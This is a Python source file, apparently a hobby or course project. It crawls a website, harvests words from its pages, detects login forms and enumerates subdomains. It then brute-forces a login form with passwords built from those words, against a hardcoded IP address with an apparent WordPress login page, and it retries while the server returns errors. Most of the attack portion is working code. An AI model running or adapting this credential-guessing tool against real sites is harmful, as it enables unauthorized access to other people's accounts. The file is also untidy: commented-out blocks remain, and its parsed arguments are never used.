from html_parser import HTMLParser
from requests import get_request, post_request, get_status
from url_utils import extract_url_parts, reformat_url

import argparse
import collections
import password_generator
import socket
import nltk
import time

password_list = []
username = 'user'
MAX_DEPTH = 10
SUBDOMAINS_FILE_PATH = './subdomains-100.txt'

class Node:
    def __init__(self, url, depth):
        self.url = url
        self.depth = depth

def add_duplicate_url(url, seen):
    # If the URL has a trailing slash, add the URL without the slash to set of seen nodes
    if url[-1] == '/':
        seen.add(url[:-1])
        
    # Else the URL doesn't have a trailing slash and add the URL with a slash to set of seen nodes
    else:
        seen.add(url + '/')       

def process_node(start_url, node, header_dict, forms, keywords, seen, add_next):
    print('Depth ' + str(node.depth) + ': Processing: ' + node.url)

    # Make GET request to the current URL      
    html_doc = get_request(node.url, header_dict)
    if html_doc is not None:
        parser = HTMLParser(html_doc)

        # Extract and add words from current page to the set of keywords
        keywords |= parser.extract_words()

        # If a login form is found, add it to the set
        form_found = parser.detect_login_form()
        if form_found:
            forms.add(node.url)
        
        # Add reachable URLs from current node if its depth < max depth
        if node.depth < MAX_DEPTH:
            # Retrieve set of URLs reachable from current node 
            linked_urls = parser.extract_urls()

            for url in linked_urls:
                # Reformat if relative url given
                if 'http' not in url:
                    url = reformat_url(url, node.url)                 

                if url not in seen and url.startswith(start_url):
                    seen.add(url)
                    add_duplicate_url(url, seen)
                    # Traversal dependent function to add next node
                    add_next(url) 

def crawl_bfs(start_url, header_dict):
    print('Starting Breadth-First Crawling')
    print('-' * 50)
    forms = set()
    keywords = set()
    seen = set()
    queue = collections.deque()
    
    # Add start URL to the queue and set of seen URLs
    start_node = Node(start_url, 0)
    queue.append(start_node)
    seen.add(start_node.url)
    add_duplicate_url(start_node.url, seen)

    # While queue is not empty
    while queue:
        node = queue.popleft()
        add_to_queue = lambda url: queue.append(Node(url, node.depth + 1))  
        process_node(start_url, node, header_dict, forms, keywords, seen, add_to_queue)
        
    return keywords, forms, seen

def crawl_dfs(start_url, header_dict):
    """ Wrapper function to initialize first call to recursive DFS crawl function """
    
    print('Starting Depth-First Crawling')
    print('-' * 50)    
    forms = set()
    keywords = set()
    seen = set()

    start_node = Node(start_url, 0)
    # Add start URL to the set of seen URLs
    seen.add(start_node.url)
    add_duplicate_url(start_node.url, seen)
    
    _crawl_dfs(start_url, start_node, header_dict, forms, keywords, seen)
    return keywords, forms, seen

def _crawl_dfs(start_url, node, header_dict, forms, keywords, seen):
    add_to_stack = lambda url: _crawl_dfs(start_url, Node(url, node.depth + 1), header_dict, forms, keywords, seen)
    process_node(start_url, node, header_dict, forms, keywords, seen, add_to_stack) 

def brute_force_pass(username ,url, header_dict, keywords):

    print(username)

    if username == "":
        username = "admin"
    
    url = reformat_url(url)
    html = get_request(url, header_dict)
    htmlParser = HTMLParser(html)
    wordCount = 0
    passwordSet = set()
    for word in keywords:
        print(word, '  :  ', password_generator.generate_password_list(word))
        passwordSet.update(password_generator.generate_password_list(word))
    
    for word in passwordSet:
        if (wordCount == 10):
            word = 'IncognitoWebCrawl'

        print('PASSWORD TESTED : ', word)
        login_string = htmlParser.create_login_string(username, word)
        post = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': str(len(login_string))}
        post_response = post_request(url, post, login_string)

        while (get_status(post_response) > 500):
            time.sleep(1)
            post_response = post_request(url, post, login_string)
        print('status code for word ', word, ' is : ', get_status(post_response))
        if (get_status(post_response) == 302):
            print('PASSWORD FOUND : ', word)
            return
        wordCount += 1
    
    print('PASSWORD NOT FOUND')

def find_url_with_login(urlset):
    for url in urlset:
        print(url)
        
        url = reformat_url(url)
        response = get_request(url, {})
        parser = HTMLParser(response)
        if (parser.detect_login_form()):
            return url
            
    
    print('LOGIN FORM NOT FOUND')


def read_subdomains():
    with open(SUBDOMAINS_FILE_PATH, "r") as f:
        return {subdomain.rstrip() for subdomain in f}

def get_subdomains(url):
    subdomains = read_subdomains()
    host, _, _ = extract_url_parts(url)
    
    url_subdomain = host.split('.')[0] # Subdomain of given URL
    
    # Check to see if the URL already has a subdomain from the list
    if url_subdomain in subdomains:
        host = host.replace(url_subdomain + '.', '')

    return {subdomain + '.' + host for subdomain in subdomains}

def web_crawler():


    """

    url = 'http://3.16.219.26/wp-login.php'
    url = reformat_url(url)
    headerdict = {}
    response = get_request(url, headerdict)
    print(headerdict)

    html = HTMLParser(response)
    if (html.detect_login_form()):
        print('AAAAA')
    
    else:
        print('BBBBBB')
    
    loginString = html.create_login_string('user','IncognitoWebC33rawl')
    print(loginString)
    post = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': str(len(loginString))}
    postResponse = post_request(url, post, loginString)

    print(get_status(postResponse))

    """

    url = 'http://3.16.219.26/'
    url = reformat_url(url)
    keywords_bfs, forms_bfs, seen_bfs = crawl_bfs(url, {})
    print('Login Form :' , forms_bfs)
    ##print('LOGIN : ',find_url_with_login(seen_bfs))
    brute_force_pass('user', forms_bfs.pop(), {}, keywords_bfs)

    """
    
    keywords_bfs, forms_bfs, seen_bfs = crawl_bfs(url, {})
    print('\n\nKeywords:', keywords_bfs, '\n\nForm:', forms_bfs, '\n\nSeen:', seen_bfs, sep=' ')

    print('\n\n\n\n\n')

    if (len(forms_bfs) == 1):
        brute_force_pass('user', 'www.google.com', {}, keywords_bfs)
    
"""

"""
    print()

    keywords_dfs, forms_dfs, seen_dfs = crawl_dfs(url, {})
    print('\n\nKeywords:', keywords_dfs, '\n\nForm:', forms_dfs, '\n\nSeen:', seen_dfs, sep=' ')
    

    print('\n\n\n', get_subdomains(url))

    for subdomain in get_subdomains(url):
        try:
            #Test whether subdomain exists 
            conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            conn.connect((subdomain, 80))

            crawl_bfs(subdomain, {})            
        except socket.gaierror:
            print('Subdomain ' + subdomain + ' was not found.')
        finally:
            conn.close()
    """
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description= 'Arguments to proceed web-crawling')
    parser.add_argument('--u', nargs = 1, type = str, help = 'USERNAME')
    parser.add_argument('--maxdepth', nargs = 1, type = int, help = 'MAX DEPTH TO CRAWL')
    parser.add_argument('--maxpages', nargs = 1, type = int, help = 'MAX PAGES TO CRAWL')
    parser.add_argument('--mode', nargs = 1, type = str, help='MODE OF CRAWLING : \'bfs\' OR \'dfs\'')
    args = parser.parse_args()
    username, mode = '',''
    maxdepth, maxpage = 0,0
    if (args.u ==None):
        username = 'admin'
    else :
        username = args.u.pop()
    if (args.maxdepth == None):
        maxdepth = 10
    else :
        maxdepth = args.maxdepth.pop()
    if (args.maxpages == None):
        maxpage = 10
    else :
        maxpage = args.maxpages.pop()
    if (not(args.mode == 'bfs' or args.mode == 'dfs')):
        mode = 'bfs'
    else :
        mode = args.mode.pop()

    print(username, ' ', maxdepth, ' ', maxpage, ' ', mode)

    
    ##web_crawler()
    